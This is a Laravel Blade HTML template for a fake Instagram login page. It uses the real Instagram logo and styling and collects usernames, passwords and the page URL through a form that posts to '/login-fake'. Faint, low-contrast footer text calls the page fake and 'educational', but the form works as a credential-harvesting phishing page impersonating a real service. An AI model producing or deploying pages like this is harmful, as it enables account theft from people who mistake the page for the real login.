<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login (Fake)</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            font-family: Arial, sans-serif;
            color: #000;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box {
            background-color: #fff;
            padding: 40px;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 350px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
        }

        .login-box img {
            width: 175px;
            margin-bottom: 20px;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            color: #000;
        }

        .login-box button {
            width: 100%;
            background-color: #3897f0;
            border: none;
            padding: 10px;
            color: white;
            font-weight: bold;
            border-radius: 4px;
            margin-top: 10px;
            cursor: pointer;
        }

        .or {
            margin: 20px 0;
            color: #999;
            position: relative;
        }

        .or::before,
        .or::after {
            content: "";
            position: absolute;
            height: 1px;
            width: 40%;
            background: #dbdbdb;
            top: 50%;
        }

        .or::before {
            left: 0;
        }

        .or::after {
            right: 0;
        }

        .facebook-login {
            color: #385185;
            text-decoration: none;
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }

        .signup-link {
            margin-top: 20px;
            color: #262626;
        }

        .signup-link a {
            color: #00376b;
            text-decoration: none;
        }

        .store-buttons {
            margin-top: 30px;
        }

        .store-buttons img {
            width: 130px;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <form class="login-box" action="/login-fake" method="POST">
            @csrf
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">

            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="site_url" value="{{ url()->current() }}">

            <button type="submit">Log in</button>

            <div class="or">OR</div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <p style="margin-top: 10px;"><a href="#" style="color: #385185; text-decoration: none;">Forgot password?</a></p>

            <div class="signup-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>

           
        </form>
        <p style="position: fixed; bottom: 40px; width: 100%; text-align: center; font-size: 11px; color: rgba(0, 0, 0, 0.3);">
            Dont use your Real Instagram Password here. This is a fake login page.
        </p>
        <p style="position: fixed; bottom: 20px; width: 100%; text-align: center; font-size: 11px; color: rgba(0, 0, 0, 0.3);">
            This page is intended for educational purposes only. And will be remove again soon
        </p>
        
    </div>
    </
</body>
</html>
